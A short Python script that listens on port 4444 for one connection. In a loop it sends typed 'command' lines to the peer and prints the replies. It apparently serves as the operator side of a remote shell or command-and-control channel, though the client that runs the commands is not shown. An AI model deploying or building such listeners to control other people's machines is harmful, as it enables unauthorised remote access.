import socket

host = ""
port = 4444

BUF=4096

s = socket.socket()
s.bind((host,port))
s.listen(1)
conn, address = s.accept()

while True:
    word = input("명령:")
    conn.send(str.encode(word))
    data = conn.recv(BUF).decode('utf-8')
    print(data)
